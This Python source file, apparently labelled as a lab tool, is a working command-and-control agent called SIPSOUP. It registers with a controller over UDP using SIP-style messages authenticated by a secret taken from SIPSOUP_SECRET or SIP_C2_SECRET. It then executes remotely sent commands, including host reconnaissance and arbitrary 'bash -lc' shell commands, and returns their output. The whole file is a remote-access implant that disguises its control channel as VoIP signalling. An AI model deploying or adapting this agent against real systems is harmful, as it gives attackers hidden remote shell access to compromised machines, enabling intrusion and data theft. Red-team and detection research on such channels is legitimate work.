import argparse
import getpass
import os
import platform
import shutil
import socket
import subprocess
import time

from sip import build, parse

COMMANDS = {
    "ping": lambda: "pong",
    "info": lambda: f"{platform.system()} {platform.release()} {platform.machine()}",
    "hostname": socket.gethostname,
    "user": getpass.getuser,
    "whoami": getpass.getuser,
    "time": lambda: time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "disk": lambda: "disk /: {:.1f} GiB libres / {:.1f} GiB".format(
        shutil.disk_usage("/").free / 2**30, shutil.disk_usage("/").total / 2**30
    ),
}


def execute(command):
    if command.startswith("bash "):
        try:
            result = subprocess.run(
                ["bash", "-lc", command[5:]],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=30,
            )
            return result.stdout.rstrip() or f"code de sortie: {result.returncode}"
        except subprocess.TimeoutExpired:
            return "commande interrompue après 30 s"
    return COMMANDS[command]() if command in COMMANDS else "commande refusée"


def main():
    parser = argparse.ArgumentParser(description="Agent SIPSOUP de laboratoire")
    parser.add_argument("--id", required=True)
    parser.add_argument("--server", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5060)
    args = parser.parse_args()
    secret = os.environ.get("SIPSOUP_SECRET") or os.environ.get("SIP_C2_SECRET")
    if not secret:
        parser.error("SIPSOUP_SECRET est requis")

    server = (args.server, args.port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 0))
    sock.sendto(build("REGISTER", "sipsoup", args.id, "online", secret), server)
    seen = set()
    while True:
        data, address = sock.recvfrom(65535)
        if address != server:
            continue
        try:
            method, target, sender, body = parse(data, secret, seen)
            if method == "MESSAGE" and target == args.id and sender == "sipsoup":
                sock.sendto(build("MESSAGE", "sipsoup", args.id, execute(body), secret), server)
        except (UnicodeError, ValueError):
            continue


if __name__ == "__main__":
    main()
